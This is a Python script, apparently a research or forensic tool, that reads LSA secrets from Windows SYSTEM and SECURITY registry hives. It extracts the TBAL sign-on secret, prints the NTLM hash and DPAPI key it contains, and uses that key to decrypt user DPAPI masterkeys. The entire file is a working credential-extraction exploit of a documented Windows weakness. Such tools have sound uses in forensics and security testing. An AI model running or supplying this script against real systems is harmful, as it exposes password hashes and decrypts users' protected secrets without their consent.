#!/usr/bin/env python3

#############################################
# Test if you can decrypt the masterkeys using the DPAPI key stored in plain while TBAL is enabled
# 
# Reference of the 'vulnerability'
# https://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/
# 
#
#
#
# This program decrypts the TBAL Secrets from LSA Secret Vault and use it on all the user masterkeys in the MK vault
# _TBAL_{68EDDCF5-0AEB-4C28-A770-AF5302ECA3C9}
# 
##########################################
import os, sys
from dpapick3 import blob, masterkey, registry
import binascii
from optparse import OptionParser


parser = OptionParser()
parser.add_option("--system", metavar="HIVE", dest="system", default=os.path.join('Windows','System32','config','SYSTEM'))
parser.add_option("--security", metavar="HIVE", dest="security", default=os.path.join('Windows','System32','config','SECURITY'))
parser.add_option("--mkdir", metavar="NAME", dest="mkdir", help="Masterkey Directory Location")
parser.add_option("--sid", metavar="NAME", dest="sid_value", help="manually specify SID")

(options, args) = parser.parse_args()
# read LSA secrets, find TBAL key
reg = registry.Regedit()
secrets = reg.get_lsa_secrets(options.security, options.system)
for i in list(secrets.keys()):
    for k, v in list(secrets[i].items()):
        if k in ('CurrVal', 'OldVal'):
            ## String
            #data = v
            try: data = v.decode('utf-16le')
            except:
                data = v.hex()
            #print(('\t'.join([i, k, '\t'+str(data)])))
            if ("TBAL" in i):
                ntlm = str(data)[32:64]
                tbal_data = str(data)[96:136]
                print ('NTLM: %s  DPAPI_key %s' % (ntlm, tbal_data))
                break
if (tbal_data) == None:    
    sys.exit("No TBAL found")


#Allow going up to here without mk dir
if (options.mkdir == None):
    print("Need Masterkey Directory option")
    sys.exit(1)
sid = ''
if options.sid_value == None:
    print("Get SID")
    i = os.scandir(os.path.dirname(os.path.dirname(os.path.join(options.mkdir))))
    for d in i:
        if (d.is_dir() and (d.name[0:3] == 'S-1')):
            sid = str(d.name)
            print("Found SID : %s " % sid)
        if sid == '':
            sys.exit('No SID found')
else:
    sid = options.sid_value

# Decrypt MKs

mkp = masterkey.MasterKeyPool()
mkp.loadDirectory(options.mkdir)
'''
for mkl in list(mkp.keys.values()):
    for mk in mkl:
        print(mk.guid)
'''
key_p = binascii.unhexlify(tbal_data)
vuelta = mkp.try_credential_hash(sid,key_p)
if (vuelta):
    print("number of MasterKeys decrypted %i" % vuelta)
